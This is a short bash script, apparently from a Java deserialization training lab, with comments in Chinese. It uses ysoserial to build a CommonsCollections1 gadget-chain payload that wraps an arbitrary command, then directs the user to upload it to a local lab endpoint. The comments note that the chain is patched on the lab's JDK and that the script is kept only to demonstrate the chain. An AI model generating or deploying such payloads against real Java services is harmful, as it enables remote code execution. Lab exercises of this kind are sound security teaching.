#!/bin/bash
# class14 — CC1链 (CommonsCollections1)
# 靶场: /class14/upload
# 注意: JDK 8u71+ 修复了 AnnotationInvocationHandler，此链在 docker JDK 8u402 无法工作。
#       仅保留用于演示 ysoserial 链结构。
cd "$(dirname "$0")"
CMD="${1:-id}"
docker cp ../../lib/ysoserial.jar javaserial-lab:/tmp/ysoserial.jar 2>/dev/null
docker exec javaserial-lab java -jar /tmp/ysoserial.jar CommonsCollections1 "$CMD" > ../../class14.ser 2>/dev/null
echo "✅ 已生成: class14.ser (命令: $CMD)"
echo "⚠️  注意: JDK 8u71+ 已修补 CC1 链，此 payload 在靶场无法触发 RCE"
echo "🎯 上传到 http://localhost:81/class14/"
